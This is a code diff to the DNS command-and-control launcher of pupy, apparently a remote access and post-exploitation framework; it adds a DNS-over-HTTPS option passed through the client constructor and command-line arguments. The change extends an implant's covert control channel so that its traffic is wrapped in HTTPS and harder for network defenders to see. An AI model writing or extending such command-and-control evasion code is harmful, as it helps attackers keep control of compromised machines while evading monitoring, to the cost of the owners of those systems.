@@ -33,10 +33,11 @@ logger = getLogger('dnscnc')
 
 
 class DNSCommandClientLauncher(DnsCommandsClient):
-    def __init__(self, domain, ns=None, qtype=None, ns_timeout=3):
+    def __init__(self, domain, doh=False, ns=None, qtype=None, ns_timeout=3):
         self.stream = None
         self.commands = []
         self.lock = Lock()
+        self.doh = doh
 
         try:
             import pupy_credentials
@@ -47,7 +48,7 @@ class DNSCommandClientLauncher(DnsCommandsClient):
             key = credentials['DNSCNC_PUB_KEY_V2']
 
         DnsCommandsClient.__init__(
-            self, domain, key, ns, qtype, ns_timeout=ns_timeout
+            self, domain, key, doh, ns, qtype, ns_timeout=ns_timeout
         )
 
     def on_session_established(self):
@@ -201,12 +202,14 @@ class DNSCncLauncher(BaseLauncher):
         super(DNSCncLauncher, self).__init__(*args, **kwargs)
         self.dnscnc = None
         self.exited = False
+        self.doh = False
 
     def parse_args(self, args):
         self.args = self.arg_parser.parse_args(args)
         self.set_host(self.args.domain)
         self.set_transport(None)
 
+        self.doh = self.args.doh
         self.ns = self.args.ns
         self.ns_timeout = self.args.ns_timeout
         self.qtype = self.args.qtype
@@ -219,7 +222,7 @@ class DNSCncLauncher(BaseLauncher):
 
         self.pupy = __import__('pupy')
         self.dnscnc = DNSCommandClientLauncher(
-            self.host, self.ns, self.qtype, self.ns_timeout)
+            self.host, self.doh, self.ns, self.qtype, self.ns_timeout)
         self.dnscnc.daemon = True
         self.dnscnc.start()
 
@@ -239,6 +242,10 @@ class DNSCncLauncher(BaseLauncher):
 
         cls.arg_parser.add_argument(
             '--ns', help='DNS server (will use internal DNS library)'
+        )
+
+        cls.arg_parser.add_argument(
+            '--doh', help='Use DNS-over-HTTPS', default=False, action='store_true'
         )
 
         cls.arg_parser.add_argument(
